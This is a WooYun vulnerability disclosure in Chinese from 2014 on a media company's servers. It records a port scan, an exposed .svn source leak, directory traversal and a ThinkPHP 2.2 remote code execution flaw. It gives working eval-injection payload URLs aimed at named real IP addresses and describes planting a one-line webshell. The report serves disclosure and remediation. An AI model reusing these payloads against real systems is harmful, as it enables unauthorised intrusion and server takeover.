{"id": 5593, "wybug_id": "wooyun-2014-049435", "wybug_title": "[世博网媒渗透测试#1]服务器某处远程命令执行间接利用可沦陷多台WEB服务器", "wybug_corp": "世博网媒", "wybug_author": "开心超人", "wybug_date": "2014-01-21 13:04", "wybug_open_date": "2014-03-07 13:04", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  TOP1:信息搜集\nC:\\Documents and Settings\\Administrator>nslookup sibore.comServer:  localhostAddress:  192.168.1.1Non-authoritative answer:Name:    sibore.comAddress:  58.49.59.87\n域名解析到58.49.59.87简单的扫描了一下开放的端口，结果如下：\nScanning 58.49.59.87 [4 ports]Completed Ping Scan at 11:32, 0.36s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 11:32Completed Parallel DNS resolution of 1 host. at 11:32, 0.16s elapsedInitiating SYN Stealth Scan at 11:32Scanning 58.49.59.87 [1000 ports]Discovered open port 25/tcp on 58.49.59.87Discovered open port 443/tcp on 58.49.59.87Discovered open port 110/tcp on 58.49.59.87Discovered open port 554/tcp on 58.49.59.87Discovered open port 80/tcp on 58.49.59.87Discovered open port 8080/tcp on 58.49.59.87Discovered open port 8009/tcp on 58.49.59.87Discovered open port 8011/tcp on 58.49.59.87Discovered open port 2105/tcp on 58.49.59.87Discovered open port 81/tcp on 58.49.59.87Discovered open port 1755/tcp on 58.49.59.87\n分析了一下，我把目标放在了81端口。拿扫描器扫描发现多处问题TOP2：源代码泄露我访问了如下URL：http://sibore.net.cn:81/.svn/源代码泄露http://sibore.net.cn:81/.svn/pristine/，其目录下包含了大量网站的源代码服务器配置出现了问题。\n\n看到下面有个wc.db，于是我下载了下来\n\n在其中的数据表NODES中我们可以看到几乎整个网站的架构。\n\nTOP3.1：目录遍历从数据表中我们看到了网站的全貌，然而危害更为严重的是网站存在很严重的目录遍历漏洞呢，由于可遍历数量太多，在此就不一一列出,上图：\n\nTOP4：THINKPHP框架远程命令执行GETSHELL我们可以看出，81端口下的网站采用THINKPHP框架搭建，且版本过低为2.2，存在高危漏洞!phpinfo():\n\n直接插入一句话木马连接之:\n\nTOP4:多台服务器远程命令执行在随后的渗透测试过程中，我发现了贵公司有好几台服务器同时存在上述漏洞\nhttp://219.140.172.152/nmcHDtouch/index.php/module/action/param1/$%7B@eval%28$_POST[c]%29%7D\n\n\n\nhttp://121.61.118.178/nmcHDtouch/index.php/module/action/param1/$%7B@eval%28$_POST[c]%29%7D\n\n\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  1.THINKPHP版本过低需升级。2.遍历漏洞需要修补。备注：上述WEB服务器可能有缺漏，管理员需要自己去修补。   版权声明：转载请注明来源 开心超人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}